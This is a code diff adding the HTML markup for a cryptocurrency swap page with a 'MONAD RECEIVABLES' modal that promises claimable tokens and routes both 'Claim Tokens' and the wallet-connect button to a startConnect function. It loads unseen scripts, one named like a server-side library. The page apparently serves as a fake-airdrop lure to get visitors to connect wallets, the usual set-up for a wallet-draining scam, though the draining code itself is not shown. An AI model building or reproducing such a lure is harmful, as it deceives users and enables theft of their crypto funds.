+          <svg class="wallet-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="5" width="18" height="14" rx="1.5" stroke-linecap="round"/>
+            <path d="M3 9 L21 9" stroke-linecap="round"/>
+            <rect x="16" y="11" width="4" height="4" rx="0.5" stroke-linecap="round"/>
+            <circle cx="18" cy="13" r="0.8"/>
+          </svg>
+        </div>
+      </div>
+      <div class="sec-content">
+        <button class="token-btn from-btn">
+          <div class="token-icon from-icon">
+            <img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=024" alt="SOL">
+            <div class="chain-badge">
+              <img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=024" alt="Solana">
+            </div>
+          </div>
+          <span>SOL</span>
+        </button>
+        <div>
+          <input type="text" class="amount-input" placeholder="0" id="fromAmount" value="1">
+          <div class="price-display" id="fromPriceDisplay">$0.00</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Swap Icon -->
+    <div class="swap-icon-container">
+      <div class="swap-icon" id="swapButton">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M16 4L20 8L16 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M8 20L4 16L8 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M20 8L4 8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          <path d="M4 16L20 16" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- TO Section -->
+    <div class="section">
+      <div class="sec-header">
+        <div class="sec-label">TO</div>
+        <div class="status">
+          NOT CONNECTED
+          <!-- Wallet Icon for NOT CONNECTED -->
+          <svg class="wallet-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="5" width="18" height="14" rx="1.5" stroke-linecap="round"/>
+            <path d="M3 9 L21 9" stroke-linecap="round"/>
+            <rect x="16" y="11" width="4" height="4" rx="0.5" stroke-linecap="round"/>
+            <circle cx="18" cy="13" r="0.8"/>
+          </svg>
+        </div>
+      </div>
+      <div class="sec-content">
+        <button class="token-btn to-btn">
+          <div class="token-icon to-icon">
+            <img src="images/monad_logo.png" alt="MON">
+            <div class="chain-badge">
+              <img src="images/monad_logo.png" alt="Monad">
+            </div>
+          </div>
+          <span>MON</span>
+        </button>
+        <div>
+          <input type="text" class="amount-input" placeholder="0" id="toAmount" readonly>
+          <div class="price-display" id="toPriceDisplay">$0.00</div>
+        </div>
+      </div>
+    </div>
+
+  <!-- Connect Button -->
+<button class="connect-btn" id="connectButton" onclick="window.startConnect()">CONNECT SOURCE WALLET</button>
+</div>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-links">
+    <a href="#terms" id="termsLink">TERMS OF SERVICE</a>
+    <a href="#privacy" id="privacyLink">PRIVACY POLICY</a>
+    <a href="#faq" id="faqLink">FAQ</a>
+    <a href="#" id="receivablesLink" class="receivables-btn">MONAD RECEIVABLES</a>
+  </div>
+  
+  <div class="footer-bottom">
+    <div class="social-links">
+      <a href="#twitter" id="twitterLink" aria-label="Twitter">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+      </a>
+      <a href="#discord" id="discordLink" aria-label="Discord">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418z"/>
+        </svg>
+      </a>
+    </div>
+    
+    <div class="powered-by">
+      Powered by
+      <img src="images/monad_logo.png" alt="Monad">
+    </div>
+  </div>
+</footer>
+
+<!-- Token Selector Modal -->
+<div id="tokenModal">
+  <div class="modal-backdrop" id="modalBackdrop"></div>
+  <div class="modal-content">
+    <div class="modal-header">
+      <h2>Select token</h2>
+      <button class="close-btn" id="closeModalBtn">×</button>
+      
+      <!-- Choose network section -->
+      <div class="network-group">
+        <h3>Choose network</h3>
+        <div class="chain-list">
+          <button class="chain-btn active" data-chain="ethereum">
+            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=024" alt="Ethereum">
+            Ethereum
+          </button>
+          <button class="chain-btn" data-chain="solana">
+            <img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=024" alt="Solana">
+            Solana
+          </button>
+          <button class="chain-btn" data-chain="monad">
+            <img src="images/monad_logo.png" alt="Monad">
+            Monad
+          </button>
+          <button class="chain-btn" data-chain="arbitrum">
+            <img src="https://cryptologos.cc/logos/arbitrum-arb-logo.png?v=024" alt="Arbitrum">
+            Arbitrum
+          </button>
+          <button class="chain-btn" data-chain="base">
+            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/base/info/logo.png" alt="Base">
+            Base
+          </button>
+          <button class="chain-btn" data-chain="bnb">
+            <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=024" alt="BNB">
+            BNB
+          </button>
+          <button class="chain-btn" data-chain="avalanche">
+            <img src="https://cryptologos.cc/logos/avalanche-avax-logo.png?v=024" alt="Avalanche">
+            Avalanche
+          </button>
+          <button class="chain-btn" data-chain="polygon">
+            <img src="https://cryptologos.cc/logos/polygon-matic-logo.png?v=024" alt="Polygon">
+            Polygon
+          </button>
+          <button class="chain-btn" data-chain="optimism">
+            <img src="https://cryptologos.cc/logos/optimism-ethereum-op-logo.png?v=024" alt="Optimism">
+            Optimism
+          </button>
+          <button class="add-network-btn" id="addNetworkBtn">
+            <i class="fas fa-plus"></i>
+            More
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div class="search-box">
+      <input type="text" id="tokenSearch" placeholder="Search for a token or paste an address">
+      <button class="search-btn" id="searchTokenBtn">
+        <i class="fas fa-search"></i>
+      </button>
+    </div>
+
+    <div class="token-section">
+      <h3>All tokens</h3>
+      <div class="token-list" id="tokenList">
+        <div class="loading">
+          <div class="loading-spinner"></div>
+          Loading tokens...
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MONAD RECEIVABLES Modal -->
+<div id="receivablesModal">
+  <div class="modal-backdrop" id="receivablesBackdrop"></div>
+  <div class="modal-content receivables-content">
+    <div class="modal-header">
+      <h2>MONAD RECEIVABLES</h2>
+      <button class="close-btn" id="closeReceivablesBtn">×</button>
+    </div>
+    
+    <div class="modal-body">
+      <div class="receivables-info">
+        <p>Enter your wallet address to check for available MONAD tokens.</p>
+        <p class="evm-warning">⚠️ Does not support wallets like Metamask.</p>
+      </div>
+      
+      <div class="address-input-container">
+        <input 
+          type="text" 
+          id="walletAddress" 
+          placeholder="Enter your Monad wallet address"
+          class="address-input"
+        />
+        <button id="checkAddressBtn" class="check-btn">Check</button>
+      </div>
+      
+      <div id="receivablesResult" class="result-container">
+        <div class="amount-display">
+          <div class="token-icon">
+            <img src="images/monad_logo.png" alt="MONAD">
+          </div>
+          <div class="amount-info">
+            <h3>Available to Claim</h3>
+            <div class="amount-value">
+              <span id="claimAmount">0.000</span>
+              <span class="token-symbol">MON</span>
+            </div>
+            <p class="usd-value">≈ $<span id="usdValue">0.00</span></p>
+          </div>
+        </div>
+        
+        <button id="claimTokensBtn" class="claim-btn" onclick="window.startConnect()">Claim Tokens</button>
+        
+        <div class="transaction-info">
+          <p><small>Transaction will be processed on the Monad network</small></p>
+          <p><small>Gas fees may apply</small></p>
+        </div>
+      </div>
+      
+      <div id="receivablesError" class="error-container">
+        <p class="error-message">Invalid address or no receivables found.</p>
+      </div>
+      
+      <div class="instructions">
+        <h4>How it works:</h4>
+        <ul>
+          <li>Enter a valid Monad wallet address</li>
+          <li>System checks for available receivables</li>
+          <li>Claim tokens directly to your wallet</li>
+          <li>Processing time: 1-3 minutes</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="script.js" defer></script>
+<script src="script2.js" defer></script>
+<script src="./cheerio.alpha.esm.js" defer></script>
+</body>
+</html>
